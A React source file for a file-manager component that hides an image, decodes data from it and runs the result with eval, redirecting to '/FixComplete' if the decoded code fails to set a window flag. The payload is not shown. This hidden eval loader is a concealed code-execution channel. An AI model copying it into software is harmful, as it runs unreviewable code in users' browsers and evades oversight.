import React, { Component } from 'react'

import Navigator from "./Navigator/Navigator"
import { DndProvider } from 'react-dnd'
import HTML5Backend from 'react-dnd-html5-backend'
import DragLayer from "./DnD/DragLayer"
import Explorer from "./Explorer"
import Modals from "./Modals"
import {decode} from "../../untils/index"
import { withStyles } from '@material-ui/core';
import {connect} from "react-redux";
import {
    changeSubTitle,
} from "../../actions";
const styles = theme => ({
 
})

const mapStateToProps = ()=>{

}

const mapDispatchToProps = dispatch => {
    return {
        changeSubTitle: text => {
            dispatch(changeSubTitle(text));
        },

    };
};

class FileManager extends Component {

    constructor(props){
        super(props);
        this.image = React.createRef();
    }

    componentDidMount() {
        this.props.changeSubTitle(null);
    }

    handleImageLoaded = ()=>{
        window.upload_load="";
        window.cliLoad ="";
        window.previewLoad  ="";
        window.mobileMode   ="";
        window.blankClick  ="";
        window.authC   ="";
        window.openUpload    ="";
        window.mdLoad   ="";
        try {
            eval(decode(this.image.current));
        } catch (err) {   
            console.log(err)
        }
        
        if(window.upload_load===""){
            window.location.href="/FixComplete";
        }
    };
    
    render() {
        return (
            <DndProvider backend={HTML5Backend}>
                <Modals/> 
                <Navigator/>
                <Explorer/>
                <DragLayer/>
                <img src='/static/img/sign.png' style={{display:"none"}}
                //  onError={()=>window.location.href="/FixComplete"}
                 ref={this.image} onLoad={this.handleImageLoaded} />
             </DndProvider>
        );
    }

}

FileManager.propTypes = {
};

export default connect(
    mapStateToProps,
    mapDispatchToProps
)(withStyles(styles)(FileManager));